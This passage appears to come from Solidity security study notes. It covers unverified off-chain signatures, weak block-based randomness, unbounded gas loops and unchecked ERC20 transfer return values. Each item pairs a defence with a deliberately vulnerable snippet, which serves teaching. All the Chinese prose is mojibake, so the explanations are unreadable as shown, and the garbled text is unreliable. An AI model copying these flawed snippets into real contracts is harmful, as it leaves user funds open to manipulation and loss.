- åˆçº¦é€»è¾‘ä¾èµ–é“¾ä¸‹ç­¾å/æ•°æ®ï¼ŒæœªéªŒè¯ç­¾åæ¥æºæˆ–å®Œæ•´æ€§ã€‚
- é˜²æŠ¤ï¼š
  - ä½¿ç”¨ EIP-712 ç­¾åæ ‡å‡†ã€‚
  - æ£€æŸ¥ `msg.sender` ä¸ç­¾åè€…å¯¹é½ã€‚

```solidity
contract Offchain {
    function exec(bytes memory data) external {
        // æ²¡æœ‰éªŒè¯ç­¾åæ¥æº
    }
}
```

-------

### **12. éšæœºæ•°ä¸å®‰å…¨**

- ç”¨ `blockhash`ã€`block.timestamp` åšéšæœºæ•°ï¼Œæ˜“è¢«çŸ¿å·¥æ“æ§ã€‚
- é˜²æŠ¤ï¼š
  - ä½¿ç”¨ Chainlink VRF æˆ–å…¶ä»–å¯éªŒè¯éšæœºæºã€‚

```solidity
function rand() public view returns(uint256) {
    return uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty)));
}
```

--------

### **13. Gas é™åˆ¶ä¸å¾ªç¯é£é™©**

- åœ¨é“¾ä¸Šå¾ªç¯éå†å¤§æ•°ç»„æˆ–æ˜ å°„ï¼Œå¯èƒ½å¯¼è‡´äº¤æ˜“å¤±è´¥æˆ– DoSã€‚
- é˜²æŠ¤ï¼š
  - é™åˆ¶æ•°æ®ç»“æ„å¤§å°ã€‚
  - åˆ†æ‰¹å¤„ç†ï¼ˆbatchï¼‰ã€‚

```solidity
function batchSend(address[] calldata users) external {
    for(uint i=0; i<users.length; i++) {
        // å¤§æ•°ç»„å¯èƒ½è€—å°½ gas
    }
}
```

--------

### **14. ERC20 / ERC721 å…¼å®¹æ€§é£é™©**

- é”™è¯¯å¤„ç† `transfer` è¿”å›å€¼ï¼ˆæœ‰äº› ERC20 ä¸è¿”å› boolï¼‰ã€‚
- é˜²æŠ¤ï¼š
  - ä½¿ç”¨ OpenZeppelin å®‰å…¨ç‰ˆæœ¬å®ç°ã€‚

```solidity
IERC20(token).transfer(to, amount); // **æ¼æ´ç‚¹**: å¿½ç•¥è¿”å›å€¼
```

--------

## **D21 â€” æœ¬å‘¨å¤ç›˜**



